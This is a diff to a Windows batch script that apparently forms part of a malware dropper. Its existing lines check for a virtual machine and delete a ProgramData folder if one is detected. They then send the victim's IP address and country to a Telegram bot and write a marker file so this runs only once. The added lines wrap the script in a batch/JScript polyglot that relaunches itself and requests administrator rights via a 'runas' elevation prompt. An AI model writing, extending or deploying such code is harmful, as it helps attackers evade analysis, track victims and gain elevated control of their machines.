@@ -1,3 +1,5 @@
+@set @x=0; /*
+ver |>NUL find /v "5." && if "%~1"=="" cscript.exe //nologo //e:jscript "%~f0"& exit /b
 powershell.exe -NoProfile -Command "if (-not ([System.Management.ManagementObjectSearcher]::new('SELECT * FROM Win32_PortConnector').Get().Count)) { Remove-Item -Path ($env:ProgramData + '\Comms') -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }" || exit
 if exist "%ProgramData%\sent" exit /b
 chcp 65001 > nul
@@ -12,3 +14,6 @@ for /f "tokens=1,2 delims=|" %a in ('powershell -NoProfile -Command "try { $j = 
 powershell -NoProfile -Command "$msg = 'TRF9' + [Environment]::NewLine + 'IP: %IP%' + [Environment]::NewLine + 'Country: %Country%'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$msg} } catch {}"
 echo done > "%ProgramData%\sent"
 endlocal
+exit /B 
+::
+*/new ActiveXObject('Shell.Application').ShellExecute (WScript.ScriptFullName,'Admin','','runas',1);
